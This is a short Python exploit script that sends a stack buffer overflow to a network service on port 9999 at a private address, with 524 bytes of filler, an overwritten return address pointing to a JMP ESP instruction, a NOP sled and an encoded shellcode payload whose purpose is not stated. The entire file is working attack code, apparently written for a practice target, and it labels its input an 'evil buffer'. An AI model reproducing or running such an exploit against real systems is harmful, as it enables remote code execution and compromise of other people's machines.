import socket

ip = "192.168.0.14"
port = 9999

# ESP Jumper 0x311712F3 ==> \xf3\x12\x17\x31

payload= ("\xd9\xed\xb8\xfd\x8d\x15\xda\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x17\x71\xf7\x2f\x1b\x62\x7a"
"\xcf\xe3\x73\x1b\x59\x06\x42\x1b\x3d\x43\xf5\xab\x35\x01\xfa"
"\x40\x1b\xb1\x89\x25\xb4\xb6\x3a\x83\xe2\xf9\xbb\xb8\xd7\x98"
"\x3f\xc3\x0b\x7a\x01\x0c\x5e\x7b\x46\x71\x93\x29\x1f\xfd\x06"
"\xdd\x14\x4b\x9b\x56\x66\x5d\x9b\x8b\x3f\x5c\x8a\x1a\x4b\x07"
"\x0c\x9d\x98\x33\x05\x85\xfd\x7e\xdf\x3e\x35\xf4\xde\x96\x07"
"\xf5\x4d\xd7\xa7\x04\x8f\x10\x0f\xf7\xfa\x68\x73\x8a\xfc\xaf"
"\x09\x50\x88\x2b\xa9\x13\x2a\x97\x4b\xf7\xad\x5c\x47\xbc\xba"
"\x3a\x44\x43\x6e\x31\x70\xc8\x91\x95\xf0\x8a\xb5\x31\x58\x48"
"\xd7\x60\x04\x3f\xe8\x72\xe7\xe0\x4c\xf9\x0a\xf4\xfc\xa0\x42"
"\x39\xcd\x5a\x93\x55\x46\x29\xa1\xfa\xfc\xa5\x89\x73\xdb\x32"
"\xed\xa9\x9b\xac\x10\x52\xdc\xe5\xd6\x06\x8c\x9d\xff\x26\x47"
"\x5d\xff\xf2\xc8\x0d\xaf\xac\xa8\xfd\x0f\x1d\x41\x17\x80\x42"
"\x71\x18\x4a\xeb\x18\xe3\x1d\xd4\x75\xeb\x2f\xbc\x87\xeb\xde"
"\x61\x01\x0d\x8a\x89\x47\x86\x23\x33\xc2\x5c\xd5\xbc\xd8\x19"
"\xd5\x37\xef\xde\x98\xbf\x9a\xcc\x4d\x30\xd1\xae\xd8\x4f\xcf"
"\xc6\x87\xc2\x94\x16\xc1\xfe\x02\x41\x86\x31\x5b\x07\x3a\x6b"
"\xf5\x35\xc7\xed\x3e\xfd\x1c\xce\xc1\xfc\xd1\x6a\xe6\xee\x2f"
"\x72\xa2\x5a\xe0\x25\x7c\x34\x46\x9c\xce\xee\x10\x73\x99\x66"
"\xe4\xbf\x1a\xf0\xe9\x95\xec\x1c\x5b\x40\xa9\x23\x54\x04\x3d"
"\x5c\x88\xb4\xc2\xb7\x08\xd4\x20\x1d\x65\x7d\xfd\xf4\xc4\xe0"
"\xfe\x23\x0a\x1d\x7d\xc1\xf3\xda\x9d\xa0\xf6\xa7\x19\x59\x8b"
"\xb8\xcf\x5d\x38\xb8\xc5")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.recv(1024)
  s.send(bytes(buffer + "\r\n" , "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
